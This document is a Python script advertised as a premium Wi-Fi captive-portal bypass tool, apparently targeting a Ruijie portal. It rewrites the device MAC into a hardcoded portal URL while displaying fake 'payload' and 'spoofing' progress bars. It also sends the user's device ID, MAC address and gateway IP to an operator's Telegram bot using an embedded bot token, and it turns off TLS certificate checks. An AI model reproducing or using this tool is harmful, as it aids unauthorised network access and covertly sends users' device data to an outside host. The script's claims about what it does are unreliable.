import os
import re
import socket
import sys
import hashlib
import uuid
import time
import webbrowser
import requests
import urllib3

# လုံခြုံရေး သတိပေးချက်များကို ခေတ္တပိတ်ထားခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """Terminal text visual and color standard configuration."""
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    RED = "\033[1;31m"
    WHITE = "\033[1;37m"
    CYAN = "\033[1;36m"
    MAGENTA = "\033[1;35m"
    GRAY = "\033[1;90m"
    RESET = "\033[0m"
    BOLD = "\033[1md"


class WiFiBypassTool:
    # Telegram API Parameters
    BOT_TOKEN = "8950422075:AAGlHOrdaqMwzxxMO3r_A3QwI8e1HzGS3Iw"
    CHAT_ID = "8404894106"
    TELEGRAM_CHANNEL = "https://t.me/starlinkfreezone"

    FIXED_URL = (
        "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&"
        "gw_id=984a6b9da30e&gw_sn=H1TA1EN003183&gw_address=192.168.110.1&"
        "gw_port=2060&ip=192.168.110.189&mac=88:2f:92:d4:c9:e0&slot_num=14&"
        "nasip=192.168.1.198&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&"
        "chap_id=%5C361&chap_challenge=%5C155%5C234%5C000%5C201%5C352%5C275%5C342%5C210%5C202%5C327%5C272%5C071%5C026%5C330%5C115%5C266"
    )
    
    USER_AGENT = (
        "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
    )

    def __init__(self) -> None:
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.USER_AGENT,
            'Accept': 'application/json, text/plain, */*',
            'Connection': 'keep-alive'
        })
        self.session.verify = False

    @staticmethod
    def clear_screen() -> None:
        os.system('clear' if os.name == 'posix' else 'cls')

    @staticmethod
    def animate_text(text: str, delay: float = 0.008) -> None:
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()

    @staticmethod
    def generate_user_id() -> str:
        """ဖုန်းတစ်လုံးချင်းစီအတွက် စိတ်ချရပြီး အမြဲတမ်းပုံသေဖြစ်မည့် User ID ထုတ်ပေးခြင်း"""
        id_file_path = os.path.expanduser("~/.elon_user_id.dat")
        
        # ၁။ အကယ်၍ ဖိုင်ရှိပြီးသားဖြစ်လျှင် ၎င်း ID ကို တိုက်ရိုက်ပြန်ယူမည်
        if os.path.exists(id_file_path):
            try:
                with open(id_file_path, "r") as f:
                    saved_id = f.read().strip()
                    if saved_id.startswith("ELON-") and len(saved_id) >= 15:
                        return saved_id
            except Exception:
                pass

        # ၂။ ဖိုင်မရှိသေးပါက Hardware Node ကို အခြေခံ၍ Unique Identifier တည်ဆောက်မည်
        try:
            hardware_string = f"{uuid.getnode()}-{os.getlogin() if hasattr(os, 'getlogin') else 'android'}"
            sha256_hash = hashlib.sha256(hardware_string.encode()).hexdigest().upper()
            generated_id = f"ELON-{sha256_hash[:4]}-{sha256_hash[4:8]}-{sha256_hash[8:12]}"
        except Exception:
            fallback_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest().upper()
            generated_id = f"ELON-{fallback_hash[:4]}-{fallback_hash[4:8]}-{fallback_hash[8:12]}"

        # ၃။ ထွက်လာသော ID ကို ဖုန်းထဲတွင် သိမ်းဆည်းထားမည်
        try:
            with open(id_file_path, "w") as f:
                f.write(generated_id)
        except Exception:
            pass

        return generated_id

    @staticmethod
    def detect_mac_address() -> str:
        try:
            mac_num = hex(uuid.getnode())[2:].zfill(12)
            formatted_mac = ":".join(mac_num[i:i+2] for i in range(0, 12, 2))
            if len(formatted_mac) == 17 and formatted_mac != "00:00:00:00:00:00":
                return formatted_mac
        except Exception:
            pass
        return "88:2f:92:d4:c9:e0"

    @staticmethod
    def detect_gateway_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            ip_parts = local_ip.split('.')
            if ip_parts[0] in ["192", "10", "172"]:
                ip_parts[-1] = "1"
                return ".".join(ip_parts)
        except Exception:
            pass
        return "192.168.110.1"

    def check_approval(self, user_id: str) -> bool:
        """Telegram Bot Updates မှတစ်ဆင့် ဝင်ရောက်ခွင့် အခြေအနေ စစ်ဆေးခြင်း"""
        url = f"https://api.telegram.org/bot{self.BOT_TOKEN}/getUpdates"
        try:
            response = requests.get(url, timeout=6).json()
            if response.get("ok"):
                for result in response.get("result", []):
                    message = result.get("message", {})
                    text = message.get("text", "").strip()
                    from_id = str(message.get("from", {}).get("id", ""))
                    
                    if from_id == self.CHAT_ID and user_id in text:
                        return True
        except Exception:
            pass
        return False

    def alert_admin(self, user_id: str, mac: str, gateway: str, status: str) -> None:
        """အသုံးပြုသူ အခြေအနေကို Admin Panel ထံ ပေးပို့ခြင်း"""
        emoji = "🟢" if status == "Approved" else "🟡"
        message = (
            f"{emoji} *Network Gateway Session*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *User ID:* `{user_id}`\n"
            f"🌐 *MAC Target:* `{mac}`\n"
            f"🚪 *Gateway IP:* `{gateway}`\n"
            f"📊 *Status:* {status}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 _To approve, forward or send this ID to the bot._" if status == "Pending" else "🚀 _User is actively bypassing._"
        )
        url = f"https://api.telegram.org/bot{self.BOT_TOKEN}/sendMessage"
        payload = {"chat_id": self.CHAT_ID, "text": message, "parse_mode": "Markdown"}
        try:
            requests.post(url, json=payload, timeout=5)
        except Exception:
            pass

    @staticmethod
    def animate_loading_bar(duration: float = 1.0, description: str = "Processing") -> None:
        frames = [
            f"{Colors.RED}■■▢▢▢▢▢▢▢▢ 20%",
            f"{Colors.YELLOW}■■■■■■▢▢▢▢ 60%",
            f"{Colors.GREEN}■■■■■■■■■■ 100%"
        ]
        interval = duration / len(frames)
        for frame in frames:
            sys.stdout.write(f"\r {Colors.CYAN}⚙ {Colors.WHITE}{description:<24} {frame}{Colors.RESET}")
            sys.stdout.flush()
            time.sleep(interval)
        sys.stdout.write(f"\r {Colors.GREEN}✔ {Colors.WHITE}{description:<24} {Colors.GREEN}[ SUCCESS ]{Colors.RESET}\n")
        sys.stdout.flush()

    def print_banner(self) -> None:
        c, r, y, g, m, w, gray = Colors.CYAN, Colors.RED, Colors.YELLOW, Colors.GREEN, Colors.MAGENTA, Colors.WHITE, Colors.GRAY
        print(f"{c}╔" + "═" * 68 + "╗")
        print(f"{c}║{r}  ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗   ██╗  ██╗ ██████╗ {c}║")
        print(f"{c}║{r}  ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝   ██║ ██╔╝██╔═══██╗{c}║")
        print(f"{c}║{y}  ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗   █████╔╝ ██║   ██║{c}║")
        print(f"{c}║{y}  ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║   ██╔═██╗ ██║   ██║{c}║")
        print(f"{c}║{g}  ██████╔╝   ██║   ██║     ██║  ██║███████║███████║   ██║  ██╗╚██████╔╝{c}║")
        print(f"{c}║{g}  ╚══════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝  ╚═╝ ╚═════╝ {c}║")
        print(f"{c}╠" + "═" * 68 + "╣")
        print(f"{c}║{m}                 ✦  ELONMUSK PREMIUM WI-FI BYPASS  ✦                {c}║")
        print(f"{c}║{gray}  Owner : {w}JOHN KO  {gray}│  Channel : {w}t.me/starlinkfreezone {gray}│  Version : {g}v2.5 {gray}║")
        print(f"{c}╚" + "═" * 68 + f"╝{w}\n")

    def _replace_mac(self, url: str, new_mac: str) -> str:
        return re.sub(r'([?&]mac=)[^&]*', r'\g<1>' + new_mac, url)

    def execute_bypass(self) -> None:
        self.clear_screen()
        self.print_banner()
        
        session_url = self.FIXED_URL
        user_id = self.generate_user_id()
        mac_address = self.detect_mac_address()
        gateway_ip = self.detect_gateway_ip()
        
        print(f" {Colors.YELLOW}⚡ Network Environment ကို စစ်ဆေးနေပါသည်...{Colors.RESET}\n")
        self.animate_loading_bar(duration=0.5, description="Fetching Device Node")
        self.animate_loading_bar(duration=0.5, description="Verifying Security Token")
        
        is_approved = self.check_approval(user_id)
        
        if not is_approved:
            self.alert_admin(user_id, mac_address, gateway_ip, "Pending")
            print(f"\n {Colors.RED}🛑 Access Denied: အသုံးပြုခွင့် ကန့်သတ်ထားပါသည်!{Colors.RESET}")
            print(f" {Colors.GRAY}╔" + "═" * 58 + "╗")
            print(f" {Colors.GRAY}║ {Colors.WHITE}Your Device ID : {Colors.GREEN}{user_id:<41} {Colors.GRAY}║")
            print(f" {Colors.GRAY}╚" + "═" * 58 + "╝")
            print(f" {Colors.YELLOW}📢 အသုံးပြုခွင့် ရယူရန် သင့် Device ID အား ကူးယူ၍ Admin ထံ တောင်းဆိုပါ-")
            print(f" {Colors.CYAN}➜ Telegram Channel: {Colors.WHITE}{self.TELEGRAM_CHANNEL}{Colors.RESET}\n")
            return

        self.alert_admin(user_id, mac_address, gateway_ip, "Approved")
        
        # System Panel Box
        print(f"\n {Colors.CYAN}┌───────────────────────── System Information ─────────────────────────┐")
        print(f" {Colors.CYAN}│ {Colors.WHITE}Registered ID  {Colors.GRAY}➜  {Colors.GREEN}{user_id:<48} {Colors.CYAN}│")
        print(f" {Colors.CYAN}│ {Colors.WHITE}Access Status  {Colors.GRAY}➜  {Colors.GREEN}ACTIVATED / PREMIUM PRIVILEGE ✅               {Colors.CYAN}│")
        print(f" {Colors.CYAN}│ {Colors.WHITE}Target Hardware{Colors.GRAY}➜  {Colors.YELLOW}{mac_address:<18} {Colors.WHITE}Gateway IP{Colors.GRAY} ➜ {Colors.YELLOW}{gateway_ip:<17} {Colors.CYAN}│")
        print(f" {Colors.CYAN}└──────────────────────────────────────────────────────────────────────┘\n")
        
        self.animate_loading_bar(duration=0.4, description="Building Payload Packet")
        self.animate_loading_bar(duration=0.4, description="Spoofing Core Interface")

        final_url = self._replace_mac(session_url, mac_address)
        
        print(f"\n {Colors.GREEN}✔ Target Configuration Successfully Applied.")
        print(f" {Colors.CYAN}🌐 စက်၏ Default Browser တွင် Auth Portal အား ချိတ်ဆက်ပေးနေပါသည်...{Colors.RESET}\n")
        time.sleep(1)

        try:
            webbrowser.open(final_url)
            print(f" {Colors.GREEN}┌" + "─" * 68 + "┐")
            self.animate_text(f" {Colors.GREEN}│  ✔ Portal အား Browser သို့ ပို့ဆောင်ပြီးပါပြီ။ Voucher ထည့်သွင်းပါ။  │", delay=0.005)
            print(f" {Colors.GREEN}└" + "─" * 68 + "┘")
        except Exception as e:
            print(f"\n {Colors.RED}✖ Browser Link မပွင့်ပါက အောက်ပါ Link အား ကူးယူ၍ ကိုယ်တိုင်ဖွင့်ပါ:\n {Colors.WHITE}{final_url}{Colors.RESET}")
        print()


if __name__ == "__main__":
    try:
        tool = WiFiBypassTool()
        tool.execute_bypass()
    except KeyboardInterrupt:
        print(f"\n\n {Colors.RED}⚠ Process Interrupted By User. Exiting safely...{Colors.RESET}\n")
